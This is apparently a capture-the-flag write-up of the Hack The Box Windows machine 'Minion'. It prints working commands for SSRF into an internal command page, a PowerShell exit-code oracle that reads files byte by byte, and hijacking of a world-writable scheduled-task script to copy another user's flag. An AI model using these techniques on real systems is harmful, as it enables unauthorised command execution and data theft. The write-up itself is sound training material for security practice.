## Overview

Minion is an insane-difficulty Windows box with an unusually small attack surface: a single IIS site on a high port. The path to user is entirely about working around constraints — a Server-Side Request Forgery reaches an internal-only command endpoint that returns *only* an exit code, and outbound TCP is firewalled, so a normal reverse shell is off the table. We turn the exit code itself into a read oracle, then abuse a world-writable script that a scheduled task runs as another user to capture the user flag. This post covers recon through `user.txt`.

Custom-dominant: an SSRF reaching a localhost command-runner that returns only an exit code is turned into a bespoke byte-by-byte exit-code read oracle with hex-chunked payload transfer, a contrived constraint puzzle.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 62696/tcp | HTTP | Microsoft IIS httpd 8.5 |

Only one port answers. Everything — including the eventual privilege path — funnels through this single web service. SMB and WinRM are not exposed externally, so any credentials we find later only matter *inside* the box.

```bash
nmap -p- -sV 10.129.7.187
nmap -p 62696 -sC -sV 10.129.7.187
```

## Enumeration

Browsing the site and fuzzing reveals `test.asp`, an admin-style page that takes a `u=` parameter and **fetches that URL on the server side**. Requesting the loopback interface through it shows an internal-only admin menu that references a `cmd.aspx` "system commands" page:

```bash
curl -s "http://10.129.7.187:62696/test.asp?u=http://127.0.0.1/"
```

```html
<h1>Site Administration</h1>
...
<a href="http://127.0.0.1/cmd.aspx">system commands</a>
```

`cmd.aspx` is bound to `127.0.0.1` only — unreachable directly, but `test.asp` will happily fetch it for us. That is Server-Side Request Forgery, and `cmd.aspx` runs whatever is in its `xcmd` parameter.

## Foothold

### Blind command execution via SSRF

Nesting the inner URL inside `u=` reaches the internal command-runner. The catch: the page returns **only** `Exit Status=N` — no stdout.

```bash
curl -s "http://10.129.7.187:62696/test.asp?u=http://127.0.0.1/cmd.aspx?xcmd=whoami" | grep -o 'Exit Status=[0-9]*'
# Exit Status=0   -> command ran as iis apppool\defaultapppool
```

A quick egress test (have the box fetch our listener) confirms **all outbound TCP is blocked** — only ICMP leaves the host. No reverse shell, no HTTP/DNS exfil.

### Turning the exit code into a read oracle

A Windows process exit code carries a full byte (0–255). So `powershell -c exit ([byte])` lets us read any file one byte per request — fully offline, no listener, no egress:

```bash
# length of a file
powershell -c exit ([IO.File]::ReadAllBytes('C:\path\file')).Length
# byte i of a file
powershell -c exit ([IO.File]::ReadAllBytes('C:\path\file')[<i>])
```

Wrapping that in a loop reconstructs any readable file's contents through the only thing the page leaks — its exit code. The IIS app-pool account is low-privilege and cannot read the user's flag directly, so we need to become a real user first.

### Pivot to a real user via a world-writable scheduled-task script

Enumerating the drive turns up a non-default folder, `C:\sysadmscripts`, containing `del_logs.bat` and `c.ps1`. The batch file is launched by a scheduled task **every five minutes as a real user account**:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -exec bypass -nop -file c:\sysadmscripts\c.ps1 c:\accesslogs
```

`c.ps1` is **world-writable**. We overwrite it so that, on its next run as that user, it copies the user's flag into a world-readable temp path and grants us read access:

```powershell
Copy-Item C:\Users\<user>\Desktop\user.txt C:\Windows\Temp\u.txt
cmd /c icacls C:\Windows\Temp\u.txt /grant Everyone:R
```

> Note: long commands and `+` characters get mangled going through the double-URL-decoding SSRF (a `+` becomes a space), so the replacement script is transferred as **hex** chunks (`echo`-appended to a temp file, then decoded on target) rather than base64.

Wait one scheduled-task cycle (≤5 min), then read the dropped file with the exit-code oracle.

## User flag

```bash
# oracle-read the world-readable copy the scheduled task produced
python3 oracle.py read 'C:\Windows\Temp\u.txt'   # HTB{...}
```

Access as the user is achieved — the flag was captured live from the box (value redacted).
